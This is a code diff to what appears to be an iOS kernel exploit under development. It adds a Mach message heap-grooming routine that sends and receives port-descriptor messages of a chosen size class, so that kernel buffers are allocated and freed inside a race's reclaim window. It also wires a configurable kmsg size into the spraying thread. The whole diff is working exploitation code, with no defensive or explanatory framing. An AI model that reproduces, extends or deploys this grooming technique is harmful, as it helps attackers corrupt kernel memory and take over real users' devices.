@@ -86,7 +86,7 @@ static p017_gettype_t  p017_gettype_fn = NULL;
 #define P017_MAG_CAP            A14_23F77_ZONE_MAGAZINE_CAP
 #define P017_RECLAIM_SPIN       500
 #define P017_A_SPIN             750 /* FIX16: A's spin to widen fn4 window */
-#define P017_BUILD              "p017v3-fix19-groom-timing"
+#define P017_BUILD              "p017v4-fix20-kmsg-groom"
 #ifndef THREAD_AFFINITY_POLICY_COUNT
 #define THREAD_AFFINITY_POLICY_COUNT 1
 #endif
@@ -573,6 +573,44 @@ static void *p017_thread_c(void *arg) {
 // ═══════════════════════════════════════════════════════════════
 static volatile int p017_d_go = 0;
 
+/* FIX20: port-kind kmsg groom (p099-shaped): send+recv a descriptor
+   message of the profiled size class so the kernel kmsg buffer of EXACTLY
+   that kmalloc class allocates+frees inside our reclaim window. */
+static mach_port_t p017_kmsg_recv_port = MACH_PORT_NULL;
+
+static void p017_kmsg_groom_cycle(int sz_bytes) {
+    if (sz_bytes < 100) return;
+    if (p017_kmsg_recv_port == MACH_PORT_NULL) {
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
+                               (mach_port_name_t *)&p017_kmsg_recv_port) != KERN_SUCCESS)
+            p017_kmsg_recv_port = MACH_PORT_NULL;
+        return;
+    }
+    mach_msg_size_t pad = (mach_msg_size_t)(sz_bytes - 44);   /* hdr 32 + desc 12 */
+    if (pad > 24000) pad = 24000;
+    struct {
+        mach_msg_header_t h;
+        mach_msg_body_t body;
+        mach_msg_port_descriptor_t port0;
+        uint8_t tail[24000];
+    } msg;
+    memset(&msg, 0, sizeof msg);
+    msg.h.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+                      MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    msg.h.msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) +
+                       sizeof(mach_msg_body_t) + sizeof(mach_msg_port_descriptor_t) + pad);
+    msg.h.msgh_remote_port = p017_kmsg_recv_port;
+    msg.h.msgh_id = 0x1717;
+    msg.body.msgh_descriptor_count = 1;
+    msg.port0.name = p017_kmsg_recv_port;       /* send right to ourselves */
+    msg.port0.disposition = MACH_MSG_TYPE_COPY_SEND;
+    msg.port0.type = MACH_MSG_PORT_DESCRIPTOR;
+    (void)mach_msg(&msg.h, MACH_SEND_MSG, msg.h.msgh_size, 0,
+                   MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    (void)mach_msg(&msg.h, MACH_RCV_MSG, 0, sizeof msg, p017_kmsg_recv_port,
+                   1 /*ms*/, MACH_PORT_NULL);
+}
+
 /* FIX19: grooming profile from Documents/p017_d_profile.txt
    "<burst> <gap_us> <mode>": mode 0 = fix18 continuous,
    1 = paced (burst -> usleep(gap_us) reclaim window -> sockets),
@@ -580,6 +618,7 @@ static volatile int p017_d_go = 0;
 static int p017_d_burst = 32;
 static int p017_d_gap_us = 0;
 static int p017_d_mode = 0;
+static int p017_d_kmsg_sz = 0;   /* FIX20: port-kind kmsg size class (0=off); e.g. 0x820 */
 
 static void p017_load_profile(void) {
     NSString *docs = [NSSearchPathForDirectoriesInDomains(
@@ -596,9 +635,13 @@ static void p017_load_profile(void) {
         if (b > 0 && b <= 64) p017_d_burst = b;
         if (g >= 0 && g <= 20000) p017_d_gap_us = g;
         if (m >= 0 && m <= 2) p017_d_mode = m;
+        if (t.count > 3 && [(NSString *)t[3] length]) {
+            int k = (int)strtol([(NSString *)t[3] UTF8String], NULL, 0);
+            if (k >= 64 && k <= 4096) p017_d_kmsg_sz = k;
+        }
     }
-    p017_log(@"[fix19] groom profile burst=%d gap_us=%d mode=%d (%@)",
-             p017_d_burst, p017_d_gap_us, p017_d_mode,
+    p017_log(@"[fix20] groom profile burst=%d gap_us=%d mode=%d kmsg_sz=0x%x (%@)",
+             p017_d_burst, p017_d_gap_us, p017_d_mode, p017_d_kmsg_sz,
              p017_d_mode == 0 ? @"fix18-continuous" :
              p017_d_mode == 1 ? @"paced-reclaim-window" : @"interleaved");
 }
@@ -627,6 +670,10 @@ static void *p017_thread_d(void *arg) {
             }
             if (p017_d_mode == 1 && p017_d_gap_us > 0) {
                 usleep((useconds_t)p017_d_gap_us);   /* reclaim window */
+            }
+            if (p017_d_kmsg_sz > 0) {
+                for (int k = 0; k < 8; k++)
+                    p017_kmsg_groom_cycle(p017_d_kmsg_sz);
             }
             int sfd[64];
             int sfdn = 0;
